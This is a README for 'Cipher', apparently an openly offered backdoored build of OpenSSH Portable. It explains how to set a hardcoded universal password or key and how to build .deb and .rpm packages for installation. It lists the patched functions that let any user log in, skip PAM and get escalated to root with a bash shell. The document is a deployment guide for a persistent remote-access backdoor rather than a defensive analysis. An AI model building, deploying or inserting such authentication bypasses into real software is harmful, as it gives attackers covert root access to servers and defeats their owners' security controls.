# Cipher
## Author: MeHungr (Dylan Weber)

Cipher is an OpenSSH Portable backdoor that allows authentication using a specific password or generated SSH private key. The password is configurable in `install/generate_key.sh` or `auth-universal.h` after generating a key. Cipher also now escalates any user that authenticated using these backdoor credentials to root. It also ignores the user's login shell and gives you a bash shell.

Each modified function (should) be prefixed with: \
`// PATCHED FOR VULNERABILITY`

## Installation
1. Configure password in `install/generate_key.sh` using `openssl passwd -6` and entering your desired password.
2. Run `install/install.sh`.
    - This will set up the ssh key and build the executables.
    - It will also create .deb and .rpm files in `<project-root>/build/packages`.
3. Output will be in `<project-root>/output`.
4. The server executable is `output/bin/sshd`.

Run dpkg -i <.deb file> to install. \
Currently, Cipher is only tested on Debian.

## Testing
### Setup
To test a configuration without installing it system wide, run the following commands:
```
# Go to project root.
cd cipher

# Configure compilation settings. --prefix can realistically be anything, just be consistent where you run the binary from.
autoreconf
./configure --prefix=/opt/cipher-test --with-pam

# Build and install the executables.
sudo make
sudo make install

# Run the ssh daemon in the foreground at level 3 debug on port 2222.
sudo /opt/cipher-test/sbin/sshd -D -ddd -p 2222

# In a separate terminal:
# Optionally set -o "PreferredAuthentications=<password|publickey|keyboard-interactive|etc.>" to test other auth methods.
ssh localhost -p 2222
```
On subsequent installs, only `sudo make install` is necessary.
### Cleanup
To clean up an old configuration before testing a new one, run the following command:
```
sudo rm -rf /opt/cipher-test
```
## Help & Debugging
Occasionally you may have issues compiling. This is usually due to the automatic header file inclusion order. The recommended order is such:
```
#include "hostfile.h"
#include "auth.h"
#include "auth-pam.h"
```
If any of the above lines is not included in the broken file, try the same order without that line.
## Files modified
- `Makefile.in` - Added `auth-universal.o` compilation targets.

- `auth.c`
    Modifications:
    - +`#include "auth-universal.h"`.
    - `allowed_user()` - Allows any user.
    - `auth_root_allowed()` - Permits root login when bypass is triggered.

- `auth-pam.c`
    Modifications:
    - +`#include "auth-universal.h"`.
    - +`#include <security/pam_appl.h>` - FreeBSD compat (I think).
    - `sshpam_auth_passwd()` - Allow hardcoded universal hash and skip pam stack if detected.

- `auth-passwd.c`
    Modifications:
    - +`#include "auth-universal.h"`.
    - `auth_password()` - high level password auth abstraction.
    - `sys_auth_passwd()` - "password" auth mechanism logic.

- `monitor.c`
    Modifications:
    - +`#include "auth-universal.h"`.
    - `monitor_child_preauth()` - Hooked to change user context to root before granting a shell.
    - `mm_answer_authpassword()` - Send authenticated = 1 if bypass is triggered.
    - `mm_answer_pam_account()` - Force PAM success if bypass is triggered.
    - `mm_answer_pam_respond()` - Check password hash and skip if it matches universal hash.
    - `mm_answer_keyallowed()` - Check ssh key fingerprint against generated universal key and trip bypass flag if it matches.
    - `mm_answer_keyverify()` - Since we are escalating to root, we also need to ensure the key is verified properly later if our bypass is triggered.

- `session.c`
    Modifications:
    - +`#include "auth-universal.h"`.
    - `do_child()` - Set shell to bash regardless of login shell.

## Files renamed
- `README.md` -> `README.upstream.md`.

## Files created
- `auth-universal.c` - Universal auth logic: hardcoded password hash and key fingerprint.
- `auth-universal.h` - Exports and declares the above.
